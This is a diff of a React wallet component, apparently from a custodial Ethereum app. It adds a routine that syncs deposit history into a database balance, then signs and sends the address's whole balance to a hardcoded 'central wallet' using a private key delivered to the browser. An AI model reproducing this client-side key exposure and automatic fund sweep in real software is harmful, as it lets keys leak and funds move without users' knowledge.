@@ -23,16 +23,51 @@ function Wallet() {
     useEffect(() => {
         localStorage.setItem('prevPage', `/wallet`);
         getWalletInfo();
-        navigator.permissions.query({name: "clipboard-write"}).then(result => {
-            if (result.state == "granted" || result.state == "prompt") {
-                navigator.clipboard.writeText("address").then(function() {
-                    console.log("success")
-                  }, function() {
-                    return;
-                  });
-            }
-          });
+        initWalletData();
     }, [])
+
+    function initWalletData() {
+        UserService.getUserInfo().then(data => {
+            const { message, numTx, address } = data;
+            if (!message) {
+                // update db balance based on tx history
+                TxHistoryService.getTransactions(address).then(txData => {
+                    if (numTx < txData.result.length) {
+                        UserService.updateNumTx(txData.result.length);
+                        for (var i = txData.result.length - 1; i >= numTx; i--) {
+                            if (txData.result[i].to.toUpperCase() === address.toUpperCase()) {
+                                console.log("reciceved: " + txData.result[i].value / 1000000000000000000 + "ETH");
+                                UserService.updateBalance(txData.result[i].value / 1000000000000000000);
+                            }
+                        }
+                    }
+                })
+                // checks real wallet ballance to see if forwarding is needed
+                web3.eth.getBalance(address)
+                    .then((amnt) => {
+                        web3.eth.getGasPrice()
+                            .then((gasPrice) => {
+                                // address contains enough eth
+                                if (amnt > gasPrice * 23000) {
+                                    // send balance to central wallet 
+                                    web3.eth.accounts.signTransaction({
+                                        to: "0x1C3BC05C4cD2902FFbF20e3b87A2cc9d793Fc42B",
+                                        value: parseInt(amnt - gasPrice * 23000),
+                                        gas: 21000
+                                    }, data.key)
+                                        .then((signedTransactionData) => {
+                                            web3.eth.sendSignedTransaction(signedTransactionData.rawTransaction).then(receipt => {
+                                                console.log("Transaction receipt: ", receipt);
+                                            })
+                                                .catch(err => console.log("Could not send tx"));
+                                        });
+                                }
+                            });
+                    })
+                    .catch(err => console.log(err));
+            }
+        });
+    }
 
     function getWalletInfo() {
         UserService.getUserInfo().then(data => {
